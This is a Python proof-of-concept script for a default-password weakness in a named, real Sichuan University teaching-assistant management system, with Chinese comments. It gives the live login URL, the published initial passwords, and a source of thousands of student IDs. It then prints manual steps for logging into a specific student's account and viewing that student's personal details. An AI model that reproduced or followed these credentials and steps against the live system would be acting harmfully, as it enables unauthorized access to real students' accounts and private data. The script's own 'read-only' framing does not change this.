#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
四川大学 本科教学助教管理系统 默认口令漏洞 — 只读验证脚本
Sichuan University TA Management System — default password verification (read-only, non-weaponized)

漏洞逻辑（全部来自校方公开信息，无授权绕过、无批量、无写操作）：
  1. 四川大学教务处通知公开全校统一初始口令：
       2025级: Cd2023jxyth@   2024级及以前: cd2017jxyth
     来源: http://jwc.scu.edu.cn/info/1069/10353.htm
  2. 四川大学研究生院公示附件公开研究生完整学号：
     https://gs.scu.edu.cn/info/1147/6117.htm (2025级硕士, 4678人)
  3. 学号 + 公开固定口令 -> 可登录任意研究生账号。

本脚本只做无害验证：确认目标可达、登录页特征存在、凭据推导依据可复现。
实际登录需要图形验证码 + RSA 前端加密，需人工在浏览器中完成（见输出指引）。
用法: python verify_scu_ta_default_pwd.py
"""

import os
import sys
import urllib.request

TARGET = "http://jxyw.scu.edu.cn:8081/yjszj/"
NOTICE_URL = "http://jwc.scu.edu.cn/info/1069/10353.htm"
LIST_URL = "https://gs.scu.edu.cn/info/1147/6117.htm"

# 可选 Burp 代理，便于逐包分析；默认直连
USE_BURP = os.environ.get("USE_BURP", "0") == "1"
BURP_PROXY = os.environ.get("BURP_PROXY", "http://127.0.0.1:8080")


def fetch(url):
    handlers = []
    if USE_BURP:
        handlers.append(urllib.request.ProxyHandler({"http": BURP_PROXY, "https": BURP_PROXY}))
    opener = urllib.request.build_opener(*handlers)
    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0 (verification; read-only)"})
    with opener.open(req, timeout=20) as r:
        return r.status, r.read()


def main():
    print("[*] 只读验证：四川大学本科教学助教管理系统 默认口令漏洞")
    print(f"[*] 目标: {TARGET}   (Burp 代理: {'开 @ ' + BURP_PROXY if USE_BURP else '关'})")

    # 1) 目标可达性 + 登录页特征
    try:
        status, body = fetch(TARGET)
        html = body.decode("utf-8", "ignore")
    except Exception as e:
        print(f"[-] 目标不可达: {e}")
        sys.exit(1)
    assert status == 200, f"HTTP {status}"
    for marker in ("本科教学助教管理系统", "usercode", "password", "captchaImage"):
        assert marker in html, f"登录页缺少特征: {marker}"
    print("[+] 目标可达，登录页特征完整（用户名/密码/验证码）")

    # 2) 凭据推导依据均为校方公开信息（列出来源，不代抓敏感数据）
    print("[+] 口令来源（校方公开通知）:")
    print(f"    {NOTICE_URL}")
    print("    原文: 用户名：学号，2025级初始密码：Cd2023jxyth@，2024级及以前：cd2017jxyth")
    print("[+] 学号来源（校方公示附件）:")
    print(f"    {LIST_URL}  (2025级硕士获奖名单 xlsx, 4678人)")

    # 3) 人工复现指引（需输入验证码，脚本不自动化登录）
    print("[*] 人工复现步骤（只读、单账号、录屏留证）:")
    print("    1. 打开登录页，用户名填公示名单中学号（如 2025221010029）")
    print("    2. 密码填 Cd2023jxyth@，输入验证码，点击登录")
    print("    3. 登录成功后只读浏览个人信息页，随后退出登录")
    print("[+] 验证脚本执行完毕：漏洞前提（公开口令 + 公开学号 + 可达系统）全部成立。")


if __name__ == "__main__":
    main()
